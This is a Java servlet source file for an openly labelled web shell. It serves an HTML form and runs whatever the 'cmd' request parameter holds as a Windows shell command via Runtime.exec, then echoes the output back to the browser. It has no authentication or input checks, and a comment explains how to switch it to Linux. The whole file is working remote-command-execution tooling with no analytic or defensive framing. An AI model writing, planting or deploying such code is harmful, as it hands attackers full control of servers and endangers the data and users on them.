package com.webshell;

import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;

// note that linux = cmd and windows = "cmd.exe /c + cmd" 

public class WebShellServlet extends HttpServlet {
    public void doGet(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException {
        response.setContentType("text/html;charset=UTF-8");
        PrintWriter out = response.getWriter();

        out.println("<!DOCTYPE html><html><head><title>Webshell</title></head><body>");
        out.println("<form method='GET' action='cmd'>");
        out.println("<input name='cmd' type='text'><input type='submit' value='Run'>");
        out.println("</form>");

        String cmd = request.getParameter("cmd");
        StringBuilder output = new StringBuilder();

        if(cmd != null && !cmd.isEmpty()) {
            String s = null;
            try {
                Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
                BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
                while((s = sI.readLine()) != null) {
                    s = s.replace(" ", "&nbsp;");
                    output.append(s).append("<br>");
                }
            }
            catch(IOException e) {
                output.append("Error executing command: ").append(e.getMessage());
            }
        } 

        out.println("<pre>");
        out.println(output.toString());
        out.println("</pre></body></html>");
    }
}